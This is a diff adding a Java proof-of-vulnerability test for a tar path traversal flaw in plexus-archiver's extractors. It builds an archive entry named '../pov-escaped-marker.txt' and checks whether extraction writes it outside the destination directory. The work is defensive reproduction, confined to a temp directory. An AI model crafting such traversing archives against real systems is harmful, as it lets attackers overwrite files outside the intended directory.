+/**
+ * Proof-of-vulnerability for CWE-022 (Path Traversal / "Zip Slip" / "Tar Slip") in
+ * org.codehaus.plexus.archiver.AbstractUnArchiver#extractFile(...), reached via
+ * TarUnArchiver#execute(...) (src/main/java/.../tar/TarUnArchiver.java:113
+ * te.getName() -> AbstractUnArchiver.java:304/309 entryName -> resolveFile(...)
+ * -> f, dirF, f.getParentFile() writes at lines 313/319/322/338).
+ *
+ * The same root cause (unvalidated entry name resolved with FileUtils.resolveFile
+ * and never checked against destDirectory before mkdirs()/FileOutputStream) is also
+ * reachable from AbstractZipUnArchiver (src/main/java/.../zip/AbstractZipUnArchiver.java
+ * lines 93-95, 178, 218, 222) which feeds the identical AbstractUnArchiver.extractFile
+ * sink. This PoV exercises the tar path because it is the most direct trace in the
+ * alert and both unarchivers converge on the exact same vulnerable sink method.
+ *
+ * A crafted TAR archive contains an entry whose name traverses out of the
+ * destination directory ("../"). The unpatched extractor resolves the entry
+ * name against the destination directory without validation and writes the
+ * file OUTSIDE the destination directory tree.
+ *
+ * Exit 0  => vulnerable behavior reproduced (file escaped the dest directory).
+ * Exit 1  => extraction was contained / rejected (patched behavior).
+ */
+public class PovPathTraversal
+{
+    public static void main( String[] args ) throws Exception
+    {
+        File workRoot = Files.createTempDirectory( "pov-plexus" ).toFile();
+
+        // Layout:
+        //   workRoot/
+        //     dest/            <-- extraction target (destination directory)
+        //     (escaped file should NOT be able to appear directly under workRoot)
+        File dest = new File( workRoot, "dest" );
+        dest.mkdirs();
+
+        // The malicious entry name traverses up out of "dest".
+        String maliciousEntryName = "../pov-escaped-marker.txt";
+        File escapedFile = new File( workRoot, "pov-escaped-marker.txt" );
+
+        // Build a malicious tar archive.
+        File tar = new File( workRoot, "malicious.tar" );
+        try ( OutputStream fos = new FileOutputStream( tar );
+              TarArchiveOutputStream tos = new TarArchiveOutputStream( fos ) )
+        {
+            tos.setLongFileMode( TarArchiveOutputStream.LONGFILE_GNU );
+            byte[] payload = "owned-by-path-traversal\n".getBytes( "UTF-8" );
+            TarArchiveEntry entry = new TarArchiveEntry( maliciousEntryName );
+            entry.setSize( payload.length );
+            tos.putArchiveEntry( entry );
+            tos.write( payload );
+            tos.closeArchiveEntry();
+            tos.finish();
+        }
+
+        // Extract through the real project code path.
+        TarUnArchiver unarchiver = new TarUnArchiver();
+        unarchiver.enableLogging( new ConsoleLogger( ConsoleLogger.LEVEL_INFO, "pov" ) );
+        unarchiver.setSourceFile( tar );
+        unarchiver.setDestDirectory( dest );
+        try
+        {
+            unarchiver.extract();
+        }
+        catch ( Exception e )
+        {
+            // A patched version is expected to reject the traversing entry.
+            System.out.println( "[POV] extraction threw (traversal rejected): " + e );
+        }
+
+        boolean escaped = escapedFile.isFile();
+        System.out.println( "[POV] destination dir : " + dest.getCanonicalPath() );
+        System.out.println( "[POV] escaped target  : " + escapedFile.getCanonicalPath() );
+        System.out.println( "[POV] escaped file exists outside dest? " + escaped );
+
+        if ( escaped )
+        {
+            System.out.println( "[POV] VULNERABLE: archive entry escaped the destination directory." );
+            System.exit( 0 );
+        }
+        else
+        {
+            System.out.println( "[POV] SAFE: extraction was contained within the destination directory." );
+            System.exit( 1 );
+        }
+    }
